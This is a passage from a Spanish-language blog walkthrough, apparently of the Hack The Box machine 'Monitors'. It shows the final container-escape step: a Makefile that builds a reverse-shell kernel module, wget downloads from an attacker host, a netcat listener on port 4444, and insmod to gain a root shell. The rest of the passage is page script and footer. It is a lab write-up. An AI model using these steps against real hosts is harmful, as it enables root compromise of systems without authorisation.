+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/62.png" alt="62" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Por otro lado, el Makefile automatiza el proceso de compilación del módulo:</p>
+
+<div class="language-make highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">obj-m</span> <span class="o">+=</span>reverse-shell.o
+
+<span class="nl">all</span><span class="o">:</span>
+	make <span class="nt">-C</span> /lib/modules/<span class="p">$(</span>shell <span class="nb">uname</span> <span class="nt">-r</span><span class="p">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="p">$(</span>PWD<span class="p">)</span> modules
+
+<span class="nl">clean</span><span class="o">:</span>
+	make <span class="nt">-C</span> /lib/modules/<span class="p">$(</span>shell <span class="nb">uname</span> <span class="nt">-r</span><span class="p">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="p">$(</span>PWD<span class="p">)</span> clean
+</code></pre></div></div>
+
+<p>Este <em>Makefile</em> crea el archivo binario del módulo (<code class="language-plaintext highlighter-rouge">reverse-shell.ko</code>) usando el código fuente <code class="language-plaintext highlighter-rouge">reverse-shell.c</code>. La línea <code class="language-plaintext highlighter-rouge">make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules</code> le indica al compilador que use la versión del <em>kernel</em> activa en el sistema anfitrión para crear el módulo. El comando <code class="language-plaintext highlighter-rouge">make clean</code> elimina cualquier archivo generado en la compilación, manteniendo el entorno limpio.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/63.png" alt="63" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Nuevamente, hostearemos un servidor en nuestra máquina atacante usando <em>Python</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+</code></pre></div></div>
+
+<p>Desde el contenedor, descargaremos los dos archivos que acabamos de crear usando <code class="language-plaintext highlighter-rouge">wget</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;nuestraIP&gt;:80/reverse-shell.c
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;nuestraIP&gt;:80/Makefile
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png" alt="64" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Posteriormente, ejecutaremos el comando <code class="language-plaintext highlighter-rouge">make</code> para compilar el módulo, lo que generará el archivo <code class="language-plaintext highlighter-rouge">reverse-shell.ko</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/65.png" alt="65" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Ahora, nos pondremos en escucha en nuestra máquina de atacante utilizando <code class="language-plaintext highlighter-rouge">Netcat</code> en el puerto que definimos en <code class="language-plaintext highlighter-rouge">reverse-shell.c</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Finalmente, inyectaremos el módulo en el kernel usando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insmod reverse-shell.ko
+</code></pre></div></div>
+
+<p>Al ejecutar este comando, obtendremos una <em>reverse shell</em> en la máquina anfitriona, esta vez con privilegios de <code class="language-plaintext highlighter-rouge">root</code>, lo que nos permitirá listar la última flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/66.png" alt="66" class="blog-image" onclick="expandImage(this)" /></p>
+
+</article>
+
+<div id="carousel" class="carousel">
+  <img id="carouselImage" class="carousel-image">
+  <div id="carouselAlt" class="carousel-alt"></div>
+  <button class="carousel-control prev" onclick="prevImage()">&#10094;</button>
+  <button class="carousel-control next" onclick="nextImage()">&#10095;</button>
+</div>
+
+<div class="image-overlay" onclick="closeImage()"></div>
+<img id="expandedImage" class="expanded-image">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var tocList = document.getElementById('toc-list');
+    var headers = document.querySelectorAll('article h3');
+
+    if (headers.length > 0) {
+      document.querySelector('.toc').style.display = 'block';
+
+      headers.forEach(function(header, index) {
+        var id = 'section-' + index;
+        header.id = id;
+
+        var listItem = document.createElement('li');
+        var link = document.createElement('a');
+        link.href = '#' + id;
+        link.textContent = header.textContent;
+        listItem.appendChild(link);
+        tocList.appendChild(listItem);
+      });
+    } else {
+      document.querySelector('.toc').style.display = 'none';
+    }
+  });
+
+  var currentImageIndex = 0;
+  var images = [];
+  var altTexts = [];
+
+  document.querySelectorAll('.blog-image').forEach((img, index) => {
+    images.push(img.src);
+    altTexts.push(img.alt || '');
+    img.setAttribute('data-index', index);
+    img.onclick = () => expandImage(img);
+  });
+
+  function expandImage(img) {
+    currentImageIndex = parseInt(img.getAttribute('data-index'));
+    showImage(currentImageIndex);
+    document.getElementById('carousel').style.display = 'block';
+    document.querySelector('.image-overlay').style.display = 'block';
+    document.body.style.overflow = 'hidden';
+
+    document.addEventListener('keydown', handleKeyPress);
+
+    document.querySelectorAll('.carousel-control').forEach(control => {
+      control.style.display = 'block';
+    });
+  }
+
+  function showImage(index) {
+    var carouselImg = document.getElementById('carouselImage');
+    carouselImg.src = images[index];
+    
+    var carouselAlt = document.getElementById('carouselAlt');
+    carouselAlt.textContent = altTexts[index];
+  }
+
+  function closeImage() {
+    document.getElementById('carousel').style.display = 'none';
+    document.querySelector('.image-overlay').style.display = 'none';
+    document.body.style.overflow = 'auto';
+
+    document.removeEventListener('keydown', handleKeyPress);
+
+    document.querySelectorAll('.carousel-control').forEach(control => {
+      control.style.display = 'none';
+    });
+  }
+
+  function prevImage() {
+    currentImageIndex = (currentImageIndex - 1 + images.length) % images.length;
+    showImage(currentImageIndex);
+  }
+
+  function nextImage() {
+    currentImageIndex = (currentImageIndex + 1) % images.length;
+    showImage(currentImageIndex);
+  }
+
+  function handleKeyPress(event) {
+    if (event.key === 'Escape') {
+      closeImage();
+    } else if (event.key === 'ArrowLeft') {
+      prevImage();
+    } else if (event.key === 'ArrowRight') {
+      nextImage();
+    }
+  }
+</script>
+
+      </section>
+    </div>
+  </div>
+
+  
+
+  <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/4.0/">
+    <span>
+        <b>MateoNitro550</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+
+  
+    <script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'G-524F5BE8G5', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+
+</body>
+</html>
